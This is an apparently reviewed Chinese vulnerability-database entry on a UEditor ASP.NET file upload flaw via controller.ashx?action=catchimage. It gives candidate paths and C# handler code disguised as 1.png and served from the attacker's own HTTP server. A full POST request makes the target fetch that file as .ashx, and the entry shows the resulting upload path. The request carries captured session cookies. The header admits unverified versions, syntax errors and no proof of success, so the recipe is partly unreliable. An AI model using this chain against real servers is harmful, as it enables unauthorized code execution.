---
source: "wy876 漏洞文库"
product: "UEditor ASP.NET"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "UEditor ASP.NET 上传处理问题（版本与权限待核）"
prerequisites: "来源所述条件，未列明部分仍待核：无准确版本或权限要求，带认证Cookie请求不能证明未授权"
side_effects: "未执行；本文需注意的操作影响：原请求问题保留：`<% @`、固定 Content-Length 与实际请求体不符，且缺独立访问返回证据；不自动修复为可执行上传链。"
source_status: "unknown"
id: "vw-262fcc208ea31ce6f1671c1f"
entity_id: "ve-262fcc208ea31ce6f1671c1f"
schema_version: "1"
---

## 核对与使用边界


- 明确更正：`net/controller.ashx` 与 C# WebHandler 表示 ASP.NET 实现，不是经典 ASP。请求携带认证/防伪会话，不能由此认定未认证可达。
- 原请求问题保留：`<% @`、固定 Content-Length 与实际请求体不符，且缺独立访问返回证据；不自动修复为可执行上传链。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：无准确版本或权限要求，带认证Cookie请求不能证明未授权

代码与实验材料：C# IHttpHandler hello非恶意shell，?.ashx后缀及目标路径，但未给hello响应

来源证据范围：语雀及wy876来源

- **结论使用边界（1）**：标题ASP与实际ASP.NET不符；依据：net/controller.ashx、C# webhandler不是经典ASP实现。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（2）**：认证条件待核；依据：请求含长ASP.NET认证Cookie和防伪Token，需核对这些字段是否为访问前提。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **代码与转录边界（3）**：请求语法与结果证据不足；依据：webhandler写&lt;% @而非典型&lt;%@，Content-Length17与body不符，缺访问返回hello。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ueditor存在任意文件上传漏洞(ASP)

### 一、漏洞描述
ueditor存在任意文件上传漏洞

### 二、影响版本


### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

将下面内容保存为1.png，上传至vps，开启一个http服务

```plain
<% @ webhandler language="C#" class="AverageHandler" %> 

using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
public bool IsReusable 
{ get { return true; } } 
public void ProcessRequest(HttpContext ctx) 
{ 
ctx.Response.Write("hello"); 
} 
}
```

```plain
python3 -m http.server 7788
```


发送如下请求包

```plain
POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: 
Cookie: ASP.NET_SessionId=0mw04qyo4jalkcgevkbdkotv; __RequestVerificationToken=TNLqbzboAbqK2T54GItDL80FA6wOaHCxRbAZAQut2sPldVD0A-AH6sGP2qalhJHbi3hWsr5xFm6876Ry9qflBN0XCyPKxxbxW3LkvPnuK7k1; .AspNet.UCApplicationCookie140400=soA1FErOUkdJQBpnPjyHZHzf2PluHG15CUYnRyqYd1zFQnAZlO2sBfAejgbJrZSp4DlToc1x83M-4FIjJ_9tUAzdhNX4CFrSWMX-Ei0swS4fwQbhx3qUwf1O_2NLM-1GPIqfeobbuEUTDJLkUHAl8QnJ5hHYlVW8l5lAPcPXhC6SgtQ16CyZdkjyA4Ze2EXeZhxnXoaL5MoUPknVb8fifAf707edXAl9C5m1oHr--G0JEXENSsTO5v0XthLL2eKUJMvV-dT4zF9v4P_6yNgNfEYFrxRXOECifw6lG3RHiqd61gHGotFovOTA7gvEvwQKlXjFq773nrkqOH8raEVObyvY8NYy9o8MFx1ugGLvnLMhi_4YblQ62Sf7mR2X8clwCJFEVEeTncPNXHi9c4HAX9b0iOIQ_JVmbWdkl-ZJar59F9eonUySWn5eKSMAhu96EWxGOb33jpmqmVw4j-RDX0O7qB0hsBLasTJHnOJsqlgiQR62SzFciYnB-wdnyu1V
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

source[]=http://x:7788/1.png?.ashx
```


```plain
/ueditor/net/upload/image/20240712/6385635362820339411030114.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tkcf54qe88wyd3z2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
